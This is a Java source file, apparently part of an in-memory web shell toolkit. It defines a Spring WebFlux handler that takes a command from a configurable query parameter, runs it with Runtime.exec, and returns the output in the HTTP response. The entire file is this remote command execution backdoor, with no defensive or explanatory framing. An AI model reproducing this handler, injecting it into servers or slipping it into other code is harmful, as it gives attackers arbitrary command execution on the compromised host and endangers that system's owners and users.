package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.http.ResponseEntity;
import org.springframework.web.server.ServerWebExchange;

import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandHandlerMethod {
    public static String paramName;

    public CommandHandlerMethod() {
    }

    public ResponseEntity<?> invoke(ServerWebExchange exchange) {
        try {
            String cmd = exchange.getRequest().getQueryParams().getFirst(paramName);
            StringBuilder result = new StringBuilder();
            try {
                if (cmd != null) {
                    Process exec = Runtime.getRuntime().exec(cmd);
                    try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()))) {
                        String line;
                        while ((line = bufferedReader.readLine()) != null) {
                            result.append(line);
                            result.append(System.lineSeparator());
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return ResponseEntity.ok(result.toString());
        } catch (Exception ex) {
            return ResponseEntity.ok(ex.getMessage());
        }
    }
}
